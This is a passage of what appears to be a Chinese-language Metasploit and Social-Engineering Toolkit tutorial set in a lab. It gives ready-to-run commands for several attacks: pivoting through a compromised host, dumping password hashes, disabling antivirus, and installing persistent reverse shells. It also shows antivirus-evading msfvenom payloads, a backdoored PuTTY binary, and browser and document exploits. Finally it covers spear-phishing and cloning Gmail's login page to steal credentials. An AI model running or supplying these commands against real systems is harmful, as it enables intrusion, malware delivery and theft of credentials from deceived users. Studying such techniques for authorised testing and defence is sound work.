+<p>实例：我们尝试对windows xp机器进行漏洞攻击，成功后以此为据点，再对内部网络的一个Ubuntu系统进行攻击，攻击机的IP是10.10.1.1&#x2F;24中的地址，目标是192.168.33.1&#x2F;24的网络。</p>
+<p>我们假设已经获得某个服务器的访问权限，我们使用scripts&#x2F;meterpreter&#x2F;目录中的Meterpreter外部脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">首先通过run get_local_subnets命令，在meterpreter会话中展示受控系统上本地子网</span><br><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line">将攻击会话放到后台运行</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">在MSF终端中执行添加路由命令，告知系统将远程网络ID(即受控主机的本地网络)通过攻击会话1来进行路由</span><br><span class="line">msf exploit(handler)&gt; route add 192.168.33.0 255.255.255.0 1</span><br><span class="line">通过 route print 命令显示当前活跃的路由设置</span><br><span class="line">msf exploit(handler)&gt; route print</span><br><span class="line">然后对目标linux系统进行第二次渗透攻击，这里使用的是基于Samba的堆溢出漏洞攻击，这个漏洞存在于我们的Metasploitable靶机上</span><br><span class="line">use linux/samba/lsa_transnames_heap</span><br><span class="line">set payload linux/x86/shell/reverse_tcp</span><br><span class="line">set LHOST 10.10.1.129</span><br><span class="line">set LPORT 8080</span><br><span class="line">set RHOST 192.168.33.132</span><br><span class="line">ifconfig</span><br><span class="line">exploit</span><br><span class="line">这种情况下，如果堆溢出成功，将会得到一个来自192.168.33.132是反弹终端。如果希望进一步对内网进行跳板扫描，可以使用metasploit内建的scanner/portscan/tcp 扫描模块，该模块能够通过metasploit来使用已建立的路由通道。</span><br><span class="line">在先前的例子中，我们在入侵系统后使用route add命令为meterpreter 的攻击会话添加路由，如果要更加自动化地完成这一操作，我们选择使用 load auto_add_route命令。</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; load auto_add_route</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-使用Meterpreter脚本"><a href="#8-使用Meterpreter脚本" class="headerlink" title="8 使用Meterpreter脚本"></a>8 使用Meterpreter脚本</h4><p>Meterpreter的扩展脚本可以在Meterpreter终端里帮助你进行系统查点，或完成事先定义好的任务。只介绍几个重要的。</p>
+<p>通过 run 脚本名字 命令，可以运行扩展脚本。</p>
+<p>比如你希望在受控系统上运行一个交互式的远程图形化工具，可以使用VNC协议将受控系统的桌面通信通过隧道方式映射过来，使得访问到远程的图形化桌面，使用 run vnc 命令，在远程系统上安装VNC会话，然后可以运行screen_unlock 命令对目标机器上的桌面进行解锁，就可以看到VNC窗口。</p>
+<ol>
+<li><p>迁移进程</p>
+<p>当我们攻击系统时，常常是对IE之类的服务进行漏洞利用，如果目标关闭了浏览器，Meterpreter 会话也将随之被关闭，为了避免这个问题，我们可以迁移进程到内存其他稳定的、不会被关闭的服务进程中</p>
+<p><code>meterpreter &gt; run post/windows/manage/migrate</code></p>
+</li>
+<li><p>关闭杀毒软件</p>
+<p><code>meterpreter &gt; run killav</code>停止相关进程</p>
+</li>
+<li><p>获取系统密码哈希值</p>
+<p><code>meterpreter &gt; run hashdump</code></p>
+</li>
+<li><p>查看目标机上的所有流量</p>
+<p><code>meterpreter &gt; run packetrecorder -i 1</code> 运行数据包记录脚本，所有被捕获的包都以.pcap的文件格式存储下来，并能够被wireshark等工具解析。</p>
+</li>
+<li><p>攫取系统信息</p>
+<p>Scraper 脚本可以列举出你想从系统得到的任何信息，可以攫取用户名和密码、下载全部注册表、挖掘密码哈希值、收集系统信息及输出 HKEY_CURRENT_USER(HKCU)</p>
+<p><code>meterpreter &gt; run scraper</code></p>
+</li>
+<li><p>控制持久化</p>
+<p>meterpreter的persistence 脚本允许注入Meterpreter代理，以确保系统重启后Meterpreter 还能运行。如果是反弹连接方式，可以设置连接攻击机的时间间隔，如果是绑定方式，可以设置在指定时间绑定开放端口。</p>
+<p>如下，我们运行persistence脚本让系统开机自启动Meterpreter(-X), 50秒（-i 50 ）重连一次，使用443端口，然后使用use multi&#x2F;handler命令进行监听，在设置了一大堆参数之后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 50 -p 443 -r 192.168.33.129</span><br><span class="line">msf &gt; use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LPORT 443</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="9-向后渗透攻击模块转变"><a href="#9-向后渗透攻击模块转变" class="headerlink" title="9 向后渗透攻击模块转变"></a>9 向后渗透攻击模块转变</h4><p>meterpreter &gt; run post&#x2F;    列举所有的后渗透攻击模块，输入后按tab键。</p>
+<h4 id="10-将命令行shell升级为Meterpreter"><a href="#10-将命令行shell升级为Meterpreter" class="headerlink" title="10 将命令行shell升级为Meterpreter"></a>10 将命令行shell升级为Meterpreter</h4><p>msf框架的一个新功能是可以在系统被攻陷的时候使用sessions -u 命令将命令行shell升级为Meterpreter。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/ms08_067_netapi</span><br><span class="line">set PAYLOAD windows/shell/reverse_tcp</span><br><span class="line">set TARGET 3</span><br><span class="line">使用setg命令设置LHOST和LPORT参数，这在使用sessions -u 1命令升级为Meterpreter的时候是必需的。setg是设置全局变量。</span><br><span class="line">setg LHOST 192.168.33.129</span><br><span class="line">setg LPORT 8080</span><br><span class="line">exploit -z</span><br><span class="line">这个命令允许在成功攻击目标后暂时不使用控制会话进行交互。</span><br><span class="line">sessions -u 1</span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="11-通过附加的Railgun-组件操作windows-API"><a href="#11-通过附加的Railgun-组件操作windows-API" class="headerlink" title="11 通过附加的Railgun 组件操作windows API"></a>11 通过附加的Railgun 组件操作windows API</h4><p>将Railgun 添加到metasplot框架，你可以通过meterpreter调用windows API，在下面的代码中，我们由Meterpreter 进入到一个交互式的Ruby shell(irb)。irb shell允许使用Ruby的语法与meterpreter直接交互。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">&gt;&gt;client.railgun.user32.MessageBoxA(0.&quot;hello&quot;,&quot;world&quot;, &quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-免杀技术"><a href="#0x04-免杀技术" class="headerlink" title="0x04 免杀技术"></a>0x04 免杀技术</h3><h4 id="1-使用MSF攻击荷载生成器创建可独立运行的二进制文件"><a href="#1-使用MSF攻击荷载生成器创建可独立运行的二进制文件" class="headerlink" title="1 使用MSF攻击荷载生成器创建可独立运行的二进制文件"></a>1 使用MSF攻击荷载生成器创建可独立运行的二进制文件</h4><p>我们先创建一个简单的反弹shell程序，它能够回连到攻击机，并弹出一个命令行shell，这里我们使用msfpayload 命令载入windows&#x2F;shell_reverse_tcp o 查看可用参数，再执行msfpayload命令，并附上生成WindowsPE文件所需要的各个参数</p>
+<p><code>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X &gt;/var/www/payload1.exe</code>，但是从2015年开始，msf 取消了msfpayload 和msfencode 模块，集成到了msfvenom中，使用命令是：<code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 -f exe -o /var/www/payload1.exe</code>现在我们有了一个可执行文件，下面我们使用multi&#x2F;handler模块在MSF终端中启动一个监听器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.1.101</span><br><span class="line">set LPORT 31337</span><br><span class="line">前期工作准备就绪</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-躲避杀软的检测"><a href="#2-躲避杀软的检测" class="headerlink" title="2 躲避杀软的检测"></a>2 躲避杀软的检测</h4><p>之前是需要用msfencode 来编码生成的可执行文件，但是现在集成到了msfvenom 中，可以使用<code>msfvenom -l encoders</code>来查看可以使用的编码格式。要使用的话使用以下命令，就是之前的命令加上一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 -e x86/shikata_ga_nai -f exe -o /var/www/payload2.exe</span><br></pre></td></tr></table></figure>
+
+<p>这个shikata_ga_nai编码技术是多态的，每次生成的攻击荷载都不一样，可以多次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们使用多次编码</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp -i 5 -b &#x27;\x00&#x27; LHOST=192.168.1.101 LPORT=31337 -e x86/shikata_ga_nai -f raw | msfvenom -a x86 --platform win -e x86/alpha_upper -i -f raw | msfvenom -a x86 --platform win -e x86/shikata_ga_nai -i -f raw | msfvenom -a x86 --platform win -i 5 -f exe -o test.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-隐秘地启动一个攻击荷载"><a href="#3-隐秘地启动一个攻击荷载" class="headerlink" title="3 隐秘地启动一个攻击荷载"></a>3 隐秘地启动一个攻击荷载</h4><p>当用户启动我们的后门文件时，要是什么都没发生，这可能会引起怀疑，为了避免被目标察觉，可以在启动攻击荷载的同时，让宿主程序也正常运行起来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们下载windows环境下的SSH客户端PuTTY,然后使用-k选项处理PuTTY -k 选项会配置攻击荷载在一个独立的线程中启动，这样宿主程序在执行时不会受到影响。</span><br><span class="line">wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 -x putty.exe -e x86/shikata_ga_nai -k -i 5 -o /var/www/putty_backdoor.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-加壳软件"><a href="#5-加壳软件" class="headerlink" title="5 加壳软件"></a>5 加壳软件</h4><p>加壳软件是一类能够对可执行文件进行加密压缩并将解压代码嵌入其中的工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们可以将木马加壳，先安装upx</span><br><span class="line">apt-get install upx</span><br><span class="line">upx -5 /var/www/payload3.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-客户端渗透攻击"><a href="#0x05-客户端渗透攻击" class="headerlink" title="0x05 客户端渗透攻击"></a>0x05 客户端渗透攻击</h3><h4 id="1-基于浏览器的渗透攻击"><a href="#1-基于浏览器的渗透攻击" class="headerlink" title="1 基于浏览器的渗透攻击"></a>1 基于浏览器的渗透攻击</h4><p>在这一节中集中讨论Metasploit 框架中基于浏览器的渗透攻击。针对浏览器的渗透攻击区别于其他传统渗透攻击的最大不同在于shellcode的触发执行方式。传统方式中，攻击者的全部目标就是获取远程代码执行的机会，然后植入ige恶意的攻击荷载，然而在浏览器渗透攻击中，为了能够执行特殊构造的攻击荷载代码，通常利用一种被称为堆喷射（heap spraying）的漏洞利用技术。</p>
+<p>空指令（NOP）和空指令滑行区（NOPslide）。空指令是这样一类汇编指令：不做任何事，继续执行下一条指令。空指令滑行区是指内存中由很多条紧密相连的空指令所构成的一个指令区域。如果程序在执行过程中遇到一连串的空指令，那么他会顺序“滑过”这段空指令区域到指令块的末尾，去执行该块指令之后的下一条指令。在Intel x86架构中，一个空指令对应的操作码是90，经常以\x90的形式出现在渗透代码中。</p>
+<p>堆喷射技术是将空指令滑行区与shellcode组合成固定的形式，然后将他们重复填充到堆中，知道填满一大块内存空间。我们通常使用浏览器在执行Javascript脚本去申请大量内存，攻击者将空指令滑行区和紧随其后的shellcode填充大块的内存区域，当程序的执行流被改变后，程序将会随机跳转到内存中的某个地方，而这个内存地址往往已被空指令构成的滑行区覆盖，紧随其后的shellcode也会随之执行。</p>
+<h4 id="2-对IE浏览器的极光漏洞进行渗透利用"><a href="#2-对IE浏览器的极光漏洞进行渗透利用" class="headerlink" title="2 对IE浏览器的极光漏洞进行渗透利用"></a>2 对IE浏览器的极光漏洞进行渗透利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use windows/browser/ms10_002_aurora</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set URIPATH /</span><br><span class="line">set LHOST 192.168.33.129</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit -z</span><br><span class="line">首先SRVHOST的默认设置是0.0.0.0：这意味着将把web服务绑定在所有网卡接口上。参数SRVPORT的默认值是8080，这个端口是目标用户将要连接的端口，来触发相应的渗透攻击，我们用80端口来代替8080，参数URIPATH是用户需要访问触发漏洞的URL地址，我们将其设为 /</span><br><span class="line">我们设置完成之后，可以用windows XP虚拟机来访问http://&lt;攻击者的IP地址&gt;去连接攻击者构造的网站。</span><br><span class="line"></span><br><span class="line">set ReverseConnectRetries 10</span><br><span class="line">改变一个反弹式连接每次尝试连接的次数，将默认尝试连接的次数从5改成10</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line">自动开一个新进程，并将自身迁移到该进程中</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-文件格式漏洞渗透攻击"><a href="#3-文件格式漏洞渗透攻击" class="headerlink" title="3 文件格式漏洞渗透攻击"></a>3 文件格式漏洞渗透攻击</h4><p>我们这次利用的安全漏洞编号是MS11_006，是在微软windows系统函数 CreateSizedDIBSECTION中存在的一个栈溢出漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use windows/fileformat/ms11_006_createsizeddibsection</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.32.128</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit</span><br><span class="line">我们输出的文件是msf.doc ，诱导对方打开，在之前要设置监听</span><br><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.32.128</span><br><span class="line">set LPORT 443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-Metasploit-辅助模块"><a href="#0x06-Metasploit-辅助模块" class="headerlink" title="0x06 Metasploit 辅助模块"></a>0x06 Metasploit 辅助模块</h3><p>可以在MSF终端中输入show auxiliary命令列出所有可用的辅助模块。</p>
+<h4 id="1-使用辅助模块"><a href="#1-使用辅助模块" class="headerlink" title="1 使用辅助模块"></a>1 使用辅助模块</h4><p>如果在对网络扫描后，除了发现一些web服务器别无所获，这时攻击面非常窄，这时候scanner&#x2F;http中的辅助模块非常有用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search scanner/http</span><br><span class="line">尝试找到一台启用了webDAV的服务器</span><br><span class="line">use scanner/http/webdav_scanner</span><br><span class="line">set RHOSTS 192.168.1.0/24,192.168.13.242.252</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-社会工程学工具包"><a href="#0x07-社会工程学工具包" class="headerlink" title="0x07 社会工程学工具包"></a>0x07 社会工程学工具包</h3><p>社会工程学工具包(SET)</p>
+<h4 id="1-配置SET工具包"><a href="#1-配置SET工具包" class="headerlink" title="1 配置SET工具包"></a>1 配置SET工具包</h4><p>WEBATTACK_EMAIL 是用来标识在Web攻击的同时是否进行邮件钓鱼攻击，这个标识选项默认是关闭的，这意味着你将配置在使用Web攻击向量时不支持邮件钓鱼。WEBATTACK_EMAIL&#x3D;ON</p>
+<p>java applrt 攻击是SET中支持的一种基于Web的攻击方式，使用自签名的java applet程序来欺骗目标系统的使用者，取得许可后运行。如果系统中安装了JDK，可以打开这个选项，并选择任意名字对applet进行签名。SELF_SIGNED_APPLET&#x3D;ON</p>
+<p>自动检测（AUTO_DETECT）选项是SET最重要的选项之一，是默认打开的,该选项打开后使得SET能够检测到所在主机的IP地址，该地址可以作为反向连接的目标地址或Web服务器架设地址，如果使用多个网络接口，或使用反弹连接攻击荷载并指向了另一个IP地址，那么需要关闭这个选项，关闭后，SET需要确定攻击主机属于哪种配置场景，来确保IP地址使用方式的正确性，例如其中一个场景包含了NET和端口转发的功能，这些配置场景方案的选项在SET接口中可以看到。</p>
+<p>AUTO_DETECT&#x3D;OFF</p>
+<p>当使用工具包的时候，默认会使用基于python 架设的内建web服务，为了优化服务性能，需要把apache_server选项开启，SET将会使用apache服务进行攻击。</p>
+<p>APACHE_SERVER&#x3D;ON</p>
+<h4 id="2-针对性钓鱼攻击向量"><a href="#2-针对性钓鱼攻击向量" class="headerlink" title="2 针对性钓鱼攻击向量"></a>2 针对性钓鱼攻击向量</h4><p>通过特殊构造的文件格式漏洞渗透攻击（例如利用Adobe PDF 漏洞的渗透攻击），主要通过发送邮件附件的方式，将包含渗透代码的文件发送到目标主机。SET使用简单邮件管理协议（SMTP）d 开放代理（匿名的或者需认证的）、Gmail和Sendmail来发送邮件。SET同时也使用标准电子邮件和基于HTML格式的电子邮件来发动钓鱼攻击。</p>
+<p>在这个例子中，我们将会发送存在漏洞代码的PDF格式文件到目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择1，Social-Engineering Attack(社会工程攻击) </span><br><span class="line">选择1，Spear-Phishing Attack Vectors（矛式网络钓鱼攻击向量）</span><br><span class="line">再次选择1，Perform a Mass Email Attack(执行大规模电子邮件攻击)</span><br><span class="line">选择8，Adobe Collab.collectEmailInfo Buffer Overflow(收集电子邮件信息缓冲区溢出漏洞)</span><br><span class="line">直接回车，选择默认的选项，windows Meterpreter Reverse tcp selected</span><br><span class="line">填写相关的监听IP和端口，更改文件名</span><br><span class="line">选择1，单个E-Mail地址攻击</span><br><span class="line">选择1，Pre-Defined Template（预定义模板）</span><br><span class="line">这个选项是选择吸引用户的主题，有孩子的照片，篮球票，电脑问题等等，我们选择5，状态报告</span><br><span class="line">填写要发送的邮件地址</span><br><span class="line">填写自己的谷歌邮箱和密码。</span><br><span class="line">然后开启监听</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-web攻击向量"><a href="#3-web攻击向量" class="headerlink" title="3 web攻击向量"></a>3 web攻击向量</h4><p>web攻击向量有可能是SET中最先进和令人兴奋的部分，因为它会特意构造出一些对目标而言是可信且具有诱惑力的网页。</p>
+<ol>
+<li><p>Java Applet</p>
+<p>java applet 攻击是SET中最成功的攻击向量之一，该攻击引入了恶意java applet程序进行智能化的浏览器检查，确保applet能在目标浏览器正确运行，同时也能在目标主机运行攻击荷载。Java applet 攻击并不被认为是java本身的漏洞，当受攻击目标浏览器恶意网页的时候，网页会弹出一个警告，问他是否需要运行一个不被信任的Java applet。因为java允许你对一个applet选择任意名字进行签名，通过修改set_config文件，并将WEBATTACK_EMAIL标志位开启。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，website Attack Vectors(网站攻击载体)</span><br><span class="line">选择1，Java applet Attack Method</span><br><span class="line">选择2，site Cloner(站点克隆)</span><br><span class="line">然后选择输入克隆的站点</span><br><span class="line">然后攻击者选择其他的攻击荷载，默认的Meterpreter反向攻击荷载通常是不错的选择，在这个攻击场景中，当选择编码方式和回连端口的时候，攻击者可以直接选择默认选项，再打开MSF监听。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端web攻击</p>
+<p>set还可以利用客户端web渗透攻击模块，要使用客户端渗透攻击，必须前期进行侦察目标系统中存在某种可能的漏洞，set中绝大多数都是针对IE浏览器的，也有针对firefox的，在这个案例中，我们将使用曾用来攻击Google的Aurora攻击向量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择2，The Metasploit Browser Exploit Method(浏览器攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），然后输入想要克隆的站点，一旦站点被克隆，我们将建立目标用户点击时所触发的漏洞渗透代码。</span><br><span class="line">选择16(你的机器不一定是16)，Microsoft Internet Explorer &quot;Aurora&quot;</span><br><span class="line">选择默认的Meterpreter windows Reverse_tcp和port，我们选择著名的IE Aurora漏洞渗透模块，当目标浏览到咋们设置的网站之后，网页看似正常，但实际上，目标系统已经通过框架（iframe）注入控制了该主机。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户名和密码获取</p>
+<p>set中的一个相对较新的功能是，它不仅具有克隆网页的功能，而且还能获取登录网页用户的敏感信息，在下一个例子中，set将克隆Gmail的登录界面，同时自动重写POST方法，先把信息POST到set设置的网页服务器上进行窃取，而后再重定向到合法网站上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择3，Credential Harvester Attack Method（凭证采集器攻击方法）</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的站点</span><br><span class="line">然后克隆的站点就会保存在/var/www/html下面，在浏览器中输入192.168.76.128:80 会发现和克隆的站点一摸一样，输入密码提交之后就会发现传到攻击者电脑上了。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>标签页劫持攻击</p>
+<p>在一次标签页劫持攻击场景中，目标用户在浏览器中打开多个标签页，在访问我们构造的恶意网页时，当点击了一个恶意连接时，网页将展示“页面正在装载，请等待……”的提示消息，而当用户切换标签页时，恶意网页检测到焦点将被转移到另一个标签页，并重写当前页面，向目标用户提示“请等待……”正在转向目标用户所访问网站的信息。</p>
+<p>实际上，目标用户被恶意网页劫持到另一个恶意构造的钓鱼标签页面，并相信他正在访问合法的E-mail应用或业务应用，并被要求登录，输入信息后会被重定向到合法网站。</p>
+</li>
+<li><p>中间人攻击</p>
+<p>中间人攻击使用HTTP referer机制从一个已受控制的网站，或利用跨站脚本漏洞（XSS），将目标用户的敏感信息传递给攻击者的HTTP服务器。</p>
+</li>
+<li><p>网页劫持</p>
+<p>这个功能允许创建一个克隆的网站，然后通过一个声称网站已经被转移至其他地方的链接展现给目标用户，当目标用户将鼠标放在链接上时，显示的是正常URL。这总攻击采用了基于时间的框架替换技术。当点击链接时，启动框架替换，攻击者可以通过修改config&#x2F;set_config选项来修改web劫持的启动时间。</p>
+<p>使用该攻击技术来配置SET，需要选择web jacking attack method 和site cloner，同时还需要输入你想克隆的网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择5，web jacking attack method(网页劫持攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的站点</span><br><span class="line">然后诱导目标访问克隆网站</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>综合多重攻击方法</p>
+<p>综合攻击向量允许攻击者把各种单一的攻击方法串联起来，实施一次多重攻击。允许配置组合不同的攻击向量，生成一个超级邪恶的web页面实施攻击。当目标用户点击链接后，攻击向量依次对目标攻击。</p>
+<p>以下例子中，攻击者将使用Java applet攻击，Metasploit客户端渗透攻击，以及网页劫持攻击。这里选择IE7客户端渗透攻击，而目标用户使用IE6，来显示在一种攻击失败的情况下，其他攻击成功的例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择6，Multi-Attack Web Method(多重攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的网站</span><br><span class="line">选择1,2,5，选择完成后输入7或者回车生成攻击</span><br><span class="line">都选择默认攻击模块。它会问你是否创建Linux的攻击模块，输入no。</span><br><span class="line">选择Internet Explorer 7 Uninitialized Memory Corruption(MS09-002)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>传染性媒体生成器</p>
+<p>这个生成器SET会创建一个文件夹，可以烧制到CD&#x2F;DVD中，一旦插入目标，Autorun.inf会被自动加载。这个现在有点过时了，毕竟很少人会用到光盘。</p>
+</li>
+<li><p>Teensy USB HID攻击向量</p>
+<p>Teensy USB HID（人机接口设备）攻击向量是定制化硬件和通过键盘模拟绕过限制攻击技术的非凡组合。一般来说，当你插入光盘或者USB时，如果自动播放被关闭，autorun.inf文件就不能自动执行这些恶意文件。但是利用这个攻击向量，可以模拟出一个键盘和鼠标，当插入这个设备的同时，电脑将识别出一个键盘，利用微处理器和主板的闪存存储空间，就可以发送一组键击命令到目标主机，进而控制目标主机。</p>
+</li>
+</ol>
+<h4 id="4-SET-的其他特性"><a href="#4-SET-的其他特性" class="headerlink" title="4. SET 的其他特性"></a>4. SET 的其他特性</h4><p>SET的交互式shell，该交互式shell可以替换Meterpreter作为一个攻击荷载。</p>
+<p>RATTE（Tommy版远程管理工具）：基于HTTP隧道攻击荷载，依赖于HTTP协议进行通信，并利用目标主机的代理设置。当目标主机使用外包监控规则对非HTTP流量进行阻断时，RATTE就显得非常有用了，RATTE还使用blowfish算法来进行HTTP协议上的加密通信。</p>
+<h3 id="0x08-Karmetasploit-无线攻击套件"><a href="#0x08-Karmetasploit-无线攻击套件" class="headerlink" title="0x08 Karmetasploit 无线攻击套件"></a>0x08 Karmetasploit 无线攻击套件</h3><p>Karmetasploit是KARMA在Metasploit框架上的实现，而KARMA是无线攻击套件。KARMA利用 windows XP和MAC OS x操作系统在搜索无线网络时所存在的漏洞，当操作系统启动时，会发送信息寻找之前链接过的无线网络。</p>
+<p>攻击者使用KARMA在他的电脑上搭建一个假冒的AP，然后监听并响应目标发送的信号，并假冒成客户端所寻找的任何类型无线网络。KARMA可以用来控制客户端流量，允许攻击者发动客户端攻击，截获密码等。</p>
+<ol>
+<li><p>配置</p>
+<p>首先配置一个DHCP服务器为目标无线网络分发IP地址，我们需要创建一个自定义文档。配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">option domain-name-servers 10.0.0.1;</span><br><span class="line">default-lease-time 60;</span><br><span class="line">max-lease-time 72;</span><br><span class="line">ddns-update-style none;</span><br><span class="line">authoritative;</span><br><span class="line">log-facility local7;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">	range 10.0.0.100 10.0.0.254;</span><br><span class="line">		option routers 10.0.0.1;</span><br><span class="line">		option domain-name-servers 10.0.0.1;</span><br><span 